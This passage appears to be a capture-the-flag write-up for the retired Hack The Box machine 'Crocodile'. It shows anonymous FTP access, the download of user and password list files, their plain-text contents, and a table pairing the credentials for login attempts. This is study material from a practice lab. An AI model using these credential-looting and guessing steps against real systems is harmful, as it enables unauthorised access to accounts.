The server allows anonymous access

```
┌──(kali㉿kali)-[~]
└─$ ftp anonymous@10.129.1.15
Connected to 10.129.1.15.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40752|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||47747|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |********************************|    33       80.97 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.68 KiB/s)

ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||40534|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |********************************|    62       88.00 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (1.33 KiB/s)

```

## Users and Credentials
┌──(kali㉿kali)-[~]
└─$ cat ~/Desktop/HackTheBox/Retired\ Machines/Crocodile/Loot/allowed.userlist
aron
pwnmeow
egotisticalsw
admin
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat ~/Desktop/HackTheBox/Retired\ Machines/Crocodile/Loot/allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd

These may correspond to one another in order like so:

| aron          | root                 |
| ------------- | -------------------- |
| pwnmeow       | Supersecretpassword1 |
| egotisticalsw | @BaASD&9032123sADS   |
| admin         | rKXM59ESxesUFHAd     |
If not, try different combos.
